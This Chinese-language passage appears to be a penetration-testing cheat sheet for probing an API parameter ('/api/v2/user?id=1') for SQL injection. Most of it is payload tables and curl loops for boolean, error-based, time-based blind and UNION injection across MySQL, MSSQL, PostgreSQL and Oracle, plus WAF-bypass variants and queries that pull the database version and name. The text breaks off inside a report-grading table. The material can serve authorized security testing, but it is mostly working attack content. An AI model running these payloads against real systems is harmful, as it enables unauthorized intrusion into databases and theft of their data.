## SQL 注入探测载荷与判断依据（`/api/v2/user?id=1`）

### 0. 先建立基线（不做这一步，后面所有判断都不可靠）

```bash
# 正常请求，记录状态码/长度/耗时/响应体哈希
curl -s -o /tmp/base.body -w '%{http_code} %{size_download} %{time_total}\n' \
  'http://TARGET/api/v2/user?id=1'
md5sum /tmp/base.body
```

证据行：`$ curl …` → `200 412 0.083` + `md5 3f2a…`
后续每个载荷都与这条基线对比：**状态码、响应长度、响应体哈希、耗时** 四项中任一项稳定偏移即为信号。

---

### 1. 布尔型（最稳，先跑这个）

| 载荷 | 预期（存在注入） | 判断依据 |
| --- | --- | --- |
| `id=1` | 基线 | — |
| `id=1'` | 500 / 报错 / 长度突变 | 语法错误被带出 |
| `id=1''` | 回到基线 | 引号闭合修复 → 强证据 |
| `id=1' AND '1'='1` | 与基线一致 | 真条件 |
| `id=1' AND '1'='2` | 长度/内容与基线不同 | 假条件 → 布尔注入成立 |
| `id=1 AND 1=1` | 基线 | 数字型真 |
| `id=1 AND 1=2` | 空结果 / 长度变化 | 数字型假 → 数字型注入成立 |

```bash
for p in "1" "1'" "1''" "1' AND '1'='1" "1' AND '1'='2" "1 AND 1=1" "1 AND 1=2"; do
  printf '%-18s ' "$p"
  curl -s -o /tmp/r.body -w '%{http_code} %{size_download}\n' \
    --get --data-urlencode "id=$p" 'http://TARGET/api/v2/user'
  md5sum /tmp/r.body | cut -c1-12
done
```

判据：`1' AND '1'='1` 与基线同哈希、`1' AND '1'='2` 不同哈希 → **字符串型布尔注入确认**。
`1 AND 1=1` / `1 AND 1=2` 分叉 → **数字型注入确认**。

---

### 2. 报错型（拿数据库指纹）

| 载荷 | 目标 | 判断依据 |
| --- | --- | --- |
| `id=1'` | 通用 | `SQL syntax`、`near "…"`、`unclosed quotation` |
| `id=1' AND extractvalue(1,concat(0x7e,version()))-- -` | MySQL | 回显 `XPATH syntax error: ~8.0.xx` |
| `id=1' AND updatexml(1,concat(0x7e,database()),1)-- -` | MySQL | 同上，带库名 |
| `id=1' AND 1=convert(int,(select @@version))-- -` | MSSQL | `Conversion failed … 'Microsoft SQL Server'` |
| `id=1' AND 1=cast((select version()) as int)-- -` | PostgreSQL | `invalid input syntax for integer` |
| `id=1' AND 1=ctxsys.drithsx.sn(1,(select banner from v$version where rownum=1))-- -` | Oracle | `ORA-` 前缀 |

证据行：`$ curl '…?id=1%27%20AND%20extractvalue(1,concat(0x7e,version()))--%20-'` → `XPATH syntax error: '~8.0.32'`

---

### 3. 时间盲注（布尔无回显时的兜底）

| 载荷 | 平台 | 判断依据 |
| --- | --- | --- |
| `id=1' AND SLEEP(5)-- -` | MySQL | 耗时 ≈ 基线 + 5s |
| `id=1';SELECT SLEEP(5)-- -` | MySQL（堆叠） | 同上 |
| `id=1' AND pg_sleep(5)-- -` | PostgreSQL | 同上 |
| `id=1';WAITFOR DELAY '0:0:5'-- -` | MSSQL | 同上 |
| `id=1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -` | Oracle | 同上 |
| `id=1' AND SLEEP(5) AND '1'='1` | MySQL | 与 `SLEEP(0)` 对照，排除网络抖动 |

```bash
for p in "1' AND SLEEP(0)-- -" "1' AND SLEEP(5)-- -"; do
  printf '%-24s ' "$p"
  curl -s -o /dev/null -w '%{time_total}\n' --get --data-urlencode "id=$p" \
    'http://TARGET/api/v2/user'
done
```

判据：`SLEEP(0)` ≈ 0.1s、`SLEEP(5)` ≈ 5.1s，**差值稳定 ≥4.5s 且重复三次一致** → 时间盲注确认。单次命中不算，必须重复。

---

### 4. 联合查询（确认列数后直接取数）

```text
id=1 ORDER BY 1-- -      → 正常
id=1 ORDER BY 2-- -      → 正常
id=1 ORDER BY N-- -      → 首次报错，N-1 即列数
id=-1 UNION SELECT 1,2,3-- -          → 页面出现 2、3 即回显位
id=-1 UNION SELECT 1,version(),database()-- -
```

判据：`ORDER BY` 二分到报错点得列数；`UNION SELECT` 用 `-1` 让原记录为空，回显位出现数字即确认可回显。

---

### 5. 绕过 WAF 的变形（命中 403/406 时换）

```text
id=1'/**/AND/**/'1'='1
id=1'%0aAND%0a'1'='1
id=1' aNd '1'='1
id=1' AND 0x31=0x31
id=1' AND '1' LIKE '1
id=1' AND '1' REGEXP '1
id=1' AND ASCII(SUBSTR((SELECT database()),1,1))>64-- -
id=1%27%20AND%20SLEEP(5)%23
```

判据：变形后响应回到基线哈希 → 原载荷被拦、变形通过，说明存在关键字过滤而非参数化。

---

### 6. 结论分级（写报告时按这个分）

| 级别 | 成立条件 |
| --- | --- |
| **已验证